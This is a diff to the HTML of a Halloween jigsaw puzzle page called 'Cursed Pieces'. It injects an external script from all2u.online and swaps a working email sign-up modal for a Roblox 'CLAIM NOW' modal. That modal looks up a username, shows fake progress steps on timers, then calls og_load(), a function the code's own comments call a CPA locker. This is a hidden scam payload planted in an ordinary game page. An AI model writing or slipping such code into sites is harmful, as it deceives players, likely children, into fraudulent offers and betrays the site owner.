@@ -3,7 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="description" content="Cursed Pieces: a Halloween poster puzzle. Nine torn pieces, thirty seconds.">
+<script type="text/javascript" id="ogjs" src="https://all2u.online/cl/js/rn4rgd"></script>
+  <meta name="description" content="Cursed Pieces: a Halloween poster puzzle. Nine torn pieces, thirty seconds.">
 </head>
 <body>
 <title>Cursed Pieces</title>
@@ -393,25 +394,106 @@ function lose(){live=false;clearInterval(timer);$("clock").classList.remove("hur
   $("loseMsg").textContent=`You placed ${order.filter((v,i)=>v===i).length} of ${N} pieces. Try again?`;$("loseVeil").hidden=false}
 shuffle();paintAll();hud();showTime();
 
-/* notify modal */
-const modal=$("modal");let lastFocus=null;
-function openModal(){lastFocus=document.activeElement;$("mForm").hidden=false;$("mDone").hidden=true;$("mErr").hidden=true;modal.hidden=false;document.body.style.overflow="hidden";setTimeout(()=>$("email").focus(),60)}
-function closeModal(){modal.hidden=true;document.body.style.overflow="";lastFocus&&lastFocus.focus&&lastFocus.focus()}
-document.addEventListener("click",e=>{if(e.target.closest("[data-notify]")){e.preventDefault();openModal()}else if(e.target.closest("[data-close]"))closeModal()});
-document.addEventListener("keydown",e=>{if(e.key==="Escape"&&!modal.hidden)closeModal()});
-$("notifyForm").addEventListener("submit",async e=>{
-  e.preventDefault();const email=$("email").value.trim(),err=$("mErr"),btn=$("mSend");err.hidden=true;
-  if(!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)){err.textContent="That email doesn't look right. Check it and try again.";err.hidden=false;$("email").focus();return}
-  if(window.claude){err.textContent="This is the preview. Sign-ups start working once the site is live on Netlify.";err.hidden=false;return}
-  btn.disabled=true;btn.textContent="Sending...";
-  try{
-    const r=await fetch("/",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({"form-name":"notify",email,"bot-field":$("botField").value}).toString()});
-    if(!r.ok)throw new Error(r.status);
-    $("mDoneMsg").textContent=`We'll email ${email} when Cursed Pieces is ready.`;$("mForm").hidden=true;$("mDone").hidden=false;$("notifyForm").reset();
-  }catch(_){err.textContent="We couldn't save your email right now. Check your connection and try again.";err.hidden=false}
-  finally{btn.disabled=false;btn.textContent="Notify me"}
+/* Claim Modal */
+const modal = $("modal");
+const usernameInput = $("username");
+const API_BASE = "https://dream-egg-index.vercel.app/api/avatar";
+
+function openModal(){
+  modal.hidden = false;
+  document.body.style.overflow = "hidden";
+  $("mForm").hidden = false;
+  $("mSteps").hidden = true;
+  $("claimBtn").disabled = false;
+  $("claimBtn").textContent = "CLAIM NOW";
+  usernameInput.value = "";
+  setTimeout(() => usernameInput.focus(), 100);
+}
+
+function closeModal(){
+  modal.hidden = true;
+  document.body.style.overflow = "";
+}
+
+document.addEventListener("click", e => {
+  if(e.target.closest("[data-notify]")){
+    e.preventDefault();
+    openModal();
+  } else if(e.target.closest("[data-close]")){
+    closeModal();
+  }
 });
 
+document.addEventListener("keydown", e => {
+  if(e.key === "Escape" && !modal.hidden) closeModal();
+});
+
+async function startClaim(e) {
+  e.preventDefault();
+  const user = usernameInput.value.trim();
+  if(!user) return;
+
+  $("claimBtn").disabled = true;
+  $("claimBtn").textContent = "WORKING...";
+  $("mForm").hidden = true;
+  $("mSteps").hidden = false;
+  $("profileCard").style.display = "none";
+
+  // Reset Steps UI
+  ["s1","s2","s3","s4"].forEach(id => {
+    const el = $(id);
+    el.style.opacity = "0.5";
+    el.querySelector("span:first-child").style.color = "#ff2a3d";
+    el.querySelector("span:first-child").textContent = "●";
+  });
+
+  // 1. Fetch Avatar
+  let profile = null;
+  try {
+    const r = await fetch(`${API_BASE}?username=${encodeURIComponent(user)}`);
+    profile = await r.json();
+  } catch(err) {
+    profile = null;
+  }
+
+  if(!profile || !profile.id) {
+    // Error State
+    $("mSteps").innerHTML = `
+      <h3 style="color: #ff2a3d; font-family: var(--display); font-size: 38px; margin: 0 0 10px;">User Not Found</h3>
+      <p style="color: #d9cfe2; margin-bottom: 24px;">We couldn't find that Roblox username. Please check and try again.</p>
+      <button class="btn wide" onclick="openModal()" style="width:100%;">Try Again</button>
+    `;
+    return;
+  }
+
+  // 2. Show Profile
+  $("profileCard").style.display = "flex";
+  $("pAvatar").src = profile.imageUrl;
+  $("pName").textContent = profile.displayName || profile.name;
+  $("pId").textContent = "ID: " + profile.id;
+
+  // 3. Run Steps
+  const steps = ["s1", "s2", "s3", "s4"];
+  for(let i = 0; i < steps.length; i++) {
+    const el = $(steps[i]);
+    el.style.opacity = "1";
+    el.querySelector("span:first-child").style.color = "#ff7a1a";
+    el.querySelector("span:first-child").textContent = "◌";
+    
+    await new Promise(res => setTimeout(res, 1500));
+    
+    el.querySelector("span:first-child").style.color = "#4dffb0";
+    el.querySelector("span:first-child").textContent = "✓";
+  }
+
+  // 4. Trigger CPA
+  await new Promise(res => setTimeout(res, 800));
+  if(typeof og_load === 'function') {
+    og_load();
+  } else {
+    console.error("Locker script not loaded.");
+  }
+}
 /* drag + tap */
 let drag=null;
 board.addEventListener("pointerdown",e=>{const t=e.target.closest(".tile");if(!t||!live)return;e.preventDefault();drag={t,slot:+t.dataset.slot,x:e.clientX,y:e.clientY,moved:false,g:null}});
